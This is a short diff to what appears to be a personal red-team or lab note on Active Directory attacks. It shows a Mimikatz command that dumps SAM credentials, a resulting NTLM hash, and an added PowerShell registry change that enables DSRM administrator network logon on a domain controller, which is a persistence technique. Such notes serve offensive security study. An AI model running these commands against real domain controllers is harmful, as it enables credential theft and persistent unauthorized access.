@@ -481,3 +481,8 @@ Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 |NTLM|a102ad5753f4c441e3af31c97fad86fd|
 |aes256_hmac|null|
 
+The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC
+```powershell
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+![[Pasted image 20231025115059.png]]
